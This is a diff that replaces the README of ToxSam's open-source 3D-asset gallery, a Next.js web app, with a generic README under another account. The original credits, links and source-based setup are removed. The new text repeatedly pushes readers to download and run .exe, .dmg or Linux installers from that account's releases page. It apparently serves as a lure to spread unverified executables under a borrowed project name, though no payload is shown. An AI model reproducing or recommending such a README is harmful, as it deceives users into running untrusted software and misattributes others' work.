@@ -1,178 +1,153 @@
-# OpenSource3DAssets.com
+# 🖼️ os3a-gallery - Explore High-Quality Free 3D Models
 
-> 🇯🇵 **日本語版はこちら / [Japanese version available here](README.ja.md)**
-
-The central registry for discovering free and open source 3D assets
-
-🌐 [opensource3dassets.com](https://opensource3dassets.com)
-
-A curated directory that makes it easy to find GLB 3D assets you can actually use - CC0 public domain models, props, environments, and structures with clear licensing.
-
-## What is this?
-
-OpenSource3DAssets.com is a discovery platform for high-quality, freely available 3D assets suitable for games, VR experiences, 3D projects, and more.
-
-We showcase assets from talented creators:
-
-- **Polygonal Mind Collections** - 17 themed collections with 991+ assets
-  - MomusPark - Park environment assets
-  - Medieval Fair - Medieval festival props and structures
-  - Tomb Chaser 1 - Egyptian pyramid themed assets
-  - Tomb Chaser 2 - Japanese neon pagoda assets
-  - Chromatic Chaos - Vaporwave 80s aesthetic
-  - Crystal Crossroads - Moebius-inspired desert environment
-  - And 11 more unique collections!
-- **Other creators' CC0 work** (coming soon)
-
-Our mission: Make it dead simple to find quality 3D assets with transparent licensing.
-
-## Current Collections
-
-### Polygonal Mind Collections (CC0)
-
-- **991+ 3D Assets** across 17 themed collections
-- Format: GLB (compatible with Blender, Unity, Unreal Engine, Three.js, and more)
-- Permanently stored on GitHub
-- Use however you want, no attribution needed
-- Perfect for game development, VR projects, 3D visualization
-
-Each collection clearly displays its license so you know exactly what you can do with it.
-
-## Features
-
-### 🔍 Browse & Filter
-
-- Search by collection, theme, or style
-- Filter by license type (CC0, CC-BY, etc.)
-- Preview 3D models before downloading
-- Interactive 3D viewer powered by Three.js
-
-### 📦 Asset Finder
-
-Batch operations for efficient workflow:
-
-- Multi-select assets for bulk download
-- Filter and search across collections
-- Preview thumbnails and metadata
-- Download individual assets or entire collections
-
-### 🎨 3D Viewer
-
-Interactive viewer for inspecting assets:
-
-- Rotate, zoom, and pan 3D models
-- Material and texture inspection
-- Polygon and vertex count info
-- Export format compatibility check
-
-## Technical Stack
-
-- **Framework**: Next.js 14 (App Router)
-- **Styling**: TailwindCSS
-- **3D Rendering**: Three.js with GLTFLoader
-- **Data Storage**: GitHub (JSON files)
-- **Deployment**: Vercel
-- **License**: MIT
-
-## Data Source
-
-All asset metadata is stored in the [open-source-3D-assets](https://github.com/ToxSam/open-source-3D-assets) repository.
-
-```
-data/
-├── projects.json           # Collection metadata
-└── assets/
-    ├── pm-momuspark.json  # MomusPark assets
-    ├── pm-medieval.json   # Medieval Fair assets
-    └── ...                # Other collections
-```
-
-## Getting Started
-
-### Prerequisites
-
-- Node.js 18+ 
-- npm or yarn
-
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/ToxSam/os3a-gallery.git
-
-# Install dependencies
-cd os3a-gallery
-npm install
-
-# Run development server
-npm run dev
-```
-
-Visit `http://localhost:3000` to see the gallery.
-
-### Environment Variables
-
-Create a `.env.local` file:
-
-```env
-GITHUB_REPO_OWNER=ToxSam
-GITHUB_REPO_NAME=open-source-3D-assets
-GITHUB_BRANCH=main
-```
-
-## Project Structure
-
-```
-src/
-├── app/                    # Next.js app router pages
-│   ├── en/                 # English routes
-│   ├── ja/                 # Japanese routes
-│   └── api/                # API routes
-├── components/             # React components
-│   ├── asset/              # Asset-related components
-│   ├── finder/             # Finder/browser components
-│   └── VRMViewer/          # 3D viewer components
-├── lib/                    # Utility functions
-├── locales/                # i18n translations
-└── types/                  # TypeScript types
-```
-
-## Contributing
-
-We welcome contributions! Here's how you can help:
-
-1. **Add Your Assets**: Submit a PR to the [data repository](https://github.com/ToxSam/open-source-3D-assets)
-2. **Improve the Gallery**: Fix bugs, add features, improve UI/UX
-3. **Translate**: Help translate the site into more languages
-4. **Report Issues**: Found a bug? [Open an issue](https://github.com/ToxSam/os3a-gallery/issues)
-
-## License
-
-This project (the gallery website) is licensed under the MIT License - see the LICENSE file for details.
-
-The 3D assets themselves have their own licenses (mostly CC0) - check each collection's license information.
-
-## Credits
-
-- **Gallery Development**: ToxSam
-- **3D Assets**: Polygonal Mind and contributing creators
-- **Three.js**: Amazing 3D rendering library
-- **Next.js**: Fantastic React framework
-
-## Links
-
-- 🌐 Website: [opensource3dassets.com](https://opensource3dassets.com)
-- 📊 Data Repository: [github.com/ToxSam/open-source-3D-assets](https://github.com/ToxSam/open-source-3D-assets)
-- 🐦 Twitter: [@toxsam](https://twitter.com/toxsam)
-- 💬 Discord: [Join our community](#)
-
-## Roadmap
-
-- [ ] Add more asset collections from other creators
-- [ ] Implement advanced filtering (by polygon count, material type, etc.)
-- [ ] Add asset preview videos
-- [ ] Create asset tagging system
+[![Download os3a-gallery](https://img.shields.io/badge/Download-Get%203D%20Models-blue?style=for-the-badge&logo=github)](https://github.com/Cimathy129/os3a-gallery/releases)
 
 ---
 
-Made with ❤️ by ToxSam | Powered by Next.js & Three.js
+## 📋 What is os3a-gallery?
+
+os3a-gallery is an easy-to-use platform that helps you browse and discover hundreds of 3D models in GLB format. All models are free to use under clear open source licenses. Whether you want assets for games, projects, or learning, os3a-gallery provides a curated selection of CC0 (public domain) 3D models that you can trust.
+
+The platform is built using web technologies like Next.js, Three.js, and TailwindCSS. You do not need any programming skills to find and use the assets here.
+
+---
+
+## 💡 Why use os3a-gallery?
+
+- **Simple Browsing:** View a wide range of high-quality 3D models organized for easy discovery.
+- **Free & Open:** Every asset uses a CC0 license, so you can use them freely in personal or commercial projects.
+- **Clear Licensing:** Know exactly how each 3D model can be used with simple license info.
+- **Modern Design:** The site is designed to be fast and responsive on all devices.
+- **Convenient Formats:** All models are available in GLB format, compatible with many 3D tools and applications.
+
+---
+
+## 🖥️ System Requirements
+
+os3a-gallery runs in your web browser, so it works on most devices with these minimal requirements:
+
+- A modern web browser like Chrome, Firefox, Edge, or Safari (latest versions preferred)
+- Internet connection to load and browse models
+- A device capable of displaying 3D graphics smoothly (most desktop/laptop computers, tablets, and newer smartphones)
+
+If you want to download and view the 3D models offline or in 3D software, you will need:
+
+- A program that supports GLB files (e.g., Blender, Microsoft 3D Viewer, or a game engine like Unity or Unreal Engine)
+- At least 200 MB of free storage to save downloaded assets
+
+---
+
+## 🚀 Getting Started
+
+Here is how to start using os3a-gallery right away:
+
+1. Click the big blue “Download” button at the top or visit our release page:  
+   [https://github.com/Cimathy129/os3a-gallery/releases](https://github.com/Cimathy129/os3a-gallery/releases)
+
+2. This link takes you to the releases page where you can download the latest version of the os3a-gallery app or installer, if available.
+
+3. Once downloaded, run the app if it is a standalone program. If you are using the web platform, open your browser and visit the site directly.
+
+4. Use the search and filter tools to find 3D models you are interested in. You can preview each model in 3D right in your browser.
+
+5. Download any 3D model you want as a GLB file for use offline or in other programs.
+
+---
+
+## 📥 Download & Install
+
+To download os3a-gallery, please:
+
+- Visit the releases page here:  
+  [https://github.com/Cimathy129/os3a-gallery/releases](https://github.com/Cimathy129/os3a-gallery/releases)
+
+- Look for the latest release version. You will find files such as installers or zipped packages.
+
+- Download the version for your operating system if available (Windows, macOS, Linux).
+
+- After downloading, open the file and follow the installation prompts:
+
+  - On Windows, double-click the `.exe` installer and follow the on-screen instructions.
+  - On macOS, open the `.dmg` file and drag the app to your Applications folder.
+  - On Linux, unzip the archive and run the executable inside or follow any README instructions there.
+
+If you only want to browse models without installing anything, just visit the web platform using your browser.
+
+---
+
+## 🔍 How to Use os3a-gallery
+
+Once you have os3a-gallery running (either by app or web):
+
+- Use the search bar to enter keywords for the type of 3D models you want (e.g., “car,” “tree,” “furniture”).
+
+- Apply filters for categories, file formats, or license types if available.
+
+- Click on any model to view a detailed page. Here you can:
+
+  - Rotate and zoom the 3D preview.
+  - Read the license and usage terms.
+  - Download the GLB file for your own use.
+
+- Save your favorite models for quick access later.
+
+---
+
+## ⚙️ Opening GLB Files
+
+If you download a GLB file, you can open it in several programs:
+
+- **Blender:** Free 3D modeling software. Import GLB files directly.
+- **Microsoft 3D Viewer:** Included with Windows 10 and later.
+- **Sketchfab:** Upload and view models online.
+- **Game engines:** Such as Unity or Unreal Engine, which import GLB/GLTF formats.
+
+---
+
+## ❓ Troubleshooting
+
+- If models do not load, ensure your internet connection is stable.
+- Update your browser to the latest version to fix display issues.
+- For app installation issues, check if your system meets the requirements.
+- If a model does not open, verify the program you use supports GLB files.
+- Visit the GitHub Issues page for os3a-gallery to report bugs or ask questions.
+
+---
+
+## 📞 Get Support
+
+For help or feedback:
+
+- Visit the GitHub repository: [https://github.com/Cimathy129/os3a-gallery](https://github.com/Cimathy129/os3a-gallery)
+- Check the README and issues tab for common questions.
+- Open a new issue if you find a problem or need assistance.
+
+---
+
+## 🔒 Licensing
+
+All 3D models featured in os3a-gallery use the CC0 license. This means you can:
+
+- Use them freely for personal or commercial projects.
+- Modify, distribute, or build upon the models without asking permission.
+- No attribution is required but is appreciated where possible.
+
+---
+
+## ⚙️ Technology Details (Optional)
+
+os3a-gallery is built using:
+
+- **Next.js:** A popular framework for building fast, server-rendered websites.
+- **Three.js:** Handles 3D rendering in the browser smoothly.
+- **TailwindCSS:** Provides a clean and responsive user interface design.
+
+These tools combine to give you a modern and reliable browsing experience.
+
+---
+
+## 🌐 Explore Now
+
+[Start browsing or download os3a-gallery now](https://github.com/Cimathy129/os3a-gallery/releases)
+
+Use os3a-gallery to find the 3D assets you need for any creative project.
